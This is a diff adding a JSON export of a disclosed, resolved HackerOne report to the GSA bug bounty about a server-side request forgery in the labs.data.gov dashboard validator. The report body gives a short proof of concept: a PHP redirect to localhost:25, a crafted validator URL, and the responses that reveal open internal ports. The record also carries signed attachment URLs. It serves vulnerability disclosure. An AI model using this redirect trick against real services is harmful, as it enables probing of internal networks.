@@ -1,0 +1,150 @@
+{
+  "id": 272095,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzIwOTU=",
+  "url": "https://hackerone.com/reports/272095",
+  "title": "SSRF/XSPA in labs.data.gov/dashboard/validate",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2017-09-26T16:40:23.115Z",
+  "submitted_at": "2017-09-26T16:40:23.115Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "haxta4ok00",
+    "url": "/haxta4ok00",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/o042lvw70gzlwr2g2fp2rzzek78y/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 50592,
+    "url": "https://hackerone.com/gsa_bbp",
+    "handle": "gsa_bbp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/iyPFgzbsX86VXw5wJHyfPg9s/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/iyPFgzbsX86VXw5wJHyfPg9s/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GSA Bounty",
+      "twitter_handle": null,
+      "website": "http://gsa.gov",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-05-05T20:18:01.922Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-04-02T11:41:41.927Z",
+  "team_member_agreed_on_going_public_at": "2020-05-05T20:18:01.820Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi.\n\nThis vulnerability allows access to all ports locally. Which is not visible from the web.\n\n1)We need an interim site file index.php\n2)Next we write in index.php\n\n`<?\nheader(\"Location: http://localhost:25\");\n?>`\n\n3)Next go to https://labs.data.gov/dashboard/validate\n\nAnd write url - for example http://example/index.php\n\nIf the port will be open (locally) that we will see the inscription\n\n`Source http://example/index.php\nSchema federal-v1.1\nValid JSON false\nErrors \nThe validator was unable to determine if this was valid JSON`\nF224225\n\nif not open\n\n`Source http://example/index.php\nSchema non-federal\nErrors \nFile not found or couldn't be downloaded`\nF224224\n\nfinal url for example\n`https://labs.data.gov/dashboard/validate?schema=federal-v1.1&output=browser&datajson_url=http%3A%2F%2Fexample%2Findex.php&qa=true&as_sfid=your_sfid&as_fid=your_fid`\n\n\nthank you ,haxta4ok00",
+  "bounty_amount": "300.0",
+  "formatted_bounty": "$300",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 224224,
+      "file_name": "false_port_258.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/224/224/379039f593be0a61e000c31961a87273182e2397/false_port_258.png?response-content-disposition=attachment%3B%20filename%3D%22false_port_258.png%22%3B%20filename%2A%3DUTF-8%27%27false_port_258.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVTSUFPXI%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T114035Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIEF48g45pEFKAjSl5efGBpDduqb7qt5OX22UCJs6wvYjAiALYMCmB2HBPlXoOAJkhEFMSvhAk2N%2BkOt6h2jz3u3WliqyBQgUEAMaDDAxMzYxOTI3NDg0OSIMpy5dIFzGb2D6JHieKo8FRYhZdmtrRFzlgscw0k8qLS%2FE70w5WABEgQNE4P2fWGbvd1rZncCc08ybiWRz%2BDSC5Zwi0MbtJL41dcCVUhAtcgEuiXjbj1KFH1VmvUP9s3n8h0IXPxE2nMvmfyMSZYYRDAOrge8Q06Ww1trUlgFuIRJqlJCGCi0V4b2ixybINEMT5%2BF6hvxOker6%2BhWq2bFcGa1HXntppkmjJt%2FOZqzFRTGR5P5vjByFz0ex0rEiWMBEQJETgkxJsQn72%2BXPIbDx6HYEIy6NV9SLY4OmsK5codv9k1NpTGsYKzY1ny5ZyHJzlBKRwAm9jPmvXNr3gWimgibT3TyWc7%2B4aUzyg82Iyiu0Hh1282LLOH9rV%2FbMoSyWDTzd2dlsLxUToR7JPlXJOQA1rM8GYy1yvy0NGuvLETQ97rLa76U0B4HZofRURj%2FaAe1hLtUAkq19GnUavPWeLKBzCuUIHGwiGIEoiEdeQL3dtwQRF1luwdFANavlX%2Bzw5dKjamkgWYbzACzBnplyzK%2BwYxVreVnzuJXDzSdYaOrbatIcdbVgllLNRAChrDns6ywEpJTMylmvhc7NZR0IKfkgHAjhgk87%2FNjnaWY346xlj8J2PzVN9ztWgqMgKLcxgAdX8BNJWFXkwIGTA8hEy6o8eZEI%2BhlV%2FAUXEKe4SupH16BnN1QXa98j60o3CuP%2Bsuiskf7GOsbXoyZ1F6ahADtQZ0ubgloaIChDsOYioqvnlj6MferB0Z02I%2BxlMM5SgeaUrYVSn1OFWdx9C5U%2F5tYcOMtNzsZLFze6uLcL3fdB4oyY2s3Un%2F7sL4HmplUtaBchd%2Fopk529rJEUEIbT6cGms8l8QcPz4rx93CYZ7%2Bay1uOnmODdcpMYzWSpETC%2BpL%2FGBjqyAZkwCJDl3lHc%2BaxSQGTF2mm38%2FppfzOvCSSoKC1ONqD333YFEjTWHsKRYiPEw1md7tLQTUb0B7wasGEa5vXpmz4osoEYPxFgwUPx%2B55owR1PUOC7P2LnG6sP8ZVGwg%2FvFLnhq9HJyEXf6G%2FfIRz8mfrieWz5UlymzftnGyysH04GJsLgSiEbN%2B0HeYpYcdXZZmu4kBwIE53HgdZIomh6OExLj6yl0JcVJP7VOR8YJrINLRg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5fc1ca7df8af54b4950c1d69532c0b791596d15690cdc73e95fdf31a5478d934",
+      "file_size": 44741,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 224225,
+      "file_name": "true_open_port_25_local.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/224/225/1f0fc4a94927f52630408b28c91b487247a85015/true_open_port_25_local.png?response-content-disposition=attachment%3B%20filename%3D%22true_open_port_25_local.png%22%3B%20filename%2A%3DUTF-8%27%27true_open_port_25_local.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVTSUFPXI%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T114035Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIEF48g45pEFKAjSl5efGBpDduqb7qt5OX22UCJs6wvYjAiALYMCmB2HBPlXoOAJkhEFMSvhAk2N%2BkOt6h2jz3u3WliqyBQgUEAMaDDAxMzYxOTI3NDg0OSIMpy5dIFzGb2D6JHieKo8FRYhZdmtrRFzlgscw0k8qLS%2FE70w5WABEgQNE4P2fWGbvd1rZncCc08ybiWRz%2BDSC5Zwi0MbtJL41dcCVUhAtcgEuiXjbj1KFH1VmvUP9s3n8h0IXPxE2nMvmfyMSZYYRDAOrge8Q06Ww1trUlgFuIRJqlJCGCi0V4b2ixybINEMT5%2BF6hvxOker6%2BhWq2bFcGa1HXntppkmjJt%2FOZqzFRTGR5P5vjByFz0ex0rEiWMBEQJETgkxJsQn72%2BXPIbDx6HYEIy6NV9SLY4OmsK5codv9k1NpTGsYKzY1ny5ZyHJzlBKRwAm9jPmvXNr3gWimgibT3TyWc7%2B4aUzyg82Iyiu0Hh1282LLOH9rV%2FbMoSyWDTzd2dlsLxUToR7JPlXJOQA1rM8GYy1yvy0NGuvLETQ97rLa76U0B4HZofRURj%2FaAe1hLtUAkq19GnUavPWeLKBzCuUIHGwiGIEoiEdeQL3dtwQRF1luwdFANavlX%2Bzw5dKjamkgWYbzACzBnplyzK%2BwYxVreVnzuJXDzSdYaOrbatIcdbVgllLNRAChrDns6ywEpJTMylmvhc7NZR0IKfkgHAjhgk87%2FNjnaWY346xlj8J2PzVN9ztWgqMgKLcxgAdX8BNJWFXkwIGTA8hEy6o8eZEI%2BhlV%2FAUXEKe4SupH16BnN1QXa98j60o3CuP%2Bsuiskf7GOsbXoyZ1F6ahADtQZ0ubgloaIChDsOYioqvnlj6MferB0Z02I%2BxlMM5SgeaUrYVSn1OFWdx9C5U%2F5tYcOMtNzsZLFze6uLcL3fdB4oyY2s3Un%2F7sL4HmplUtaBchd%2Fopk529rJEUEIbT6cGms8l8QcPz4rx93CYZ7%2Bay1uOnmODdcpMYzWSpETC%2BpL%2FGBjqyAZkwCJDl3lHc%2BaxSQGTF2mm38%2FppfzOvCSSoKC1ONqD333YFEjTWHsKRYiPEw1md7tLQTUb0B7wasGEa5vXpmz4osoEYPxFgwUPx%2B55owR1PUOC7P2LnG6sP8ZVGwg%2FvFLnhq9HJyEXf6G%2FfIRz8mfrieWz5UlymzftnGyysH04GJsLgSiEbN%2B0HeYpYcdXZZmu4kBwIE53HgdZIomh6OExLj6yl0JcVJP7VOR8YJrINLRg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=42854c8913616961ff46193621634ad0f6e1d541d8a2f6a902afc0cbcdb899af",
+      "file_size": 51126,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 41,
+  "voters": [
+    "jensec",
+    "shreyaschavhan",
+    "rook1337",
+    "hunter",
+    "ali",
+    "dozybrit",
+    "xsstestov",
+    "since2003",
+    "r3y",
+    "sa1tama0",
+    "and 31 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 81476,
+    "asset_type": "URL",
+    "asset_identifier": "labs.data.gov",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
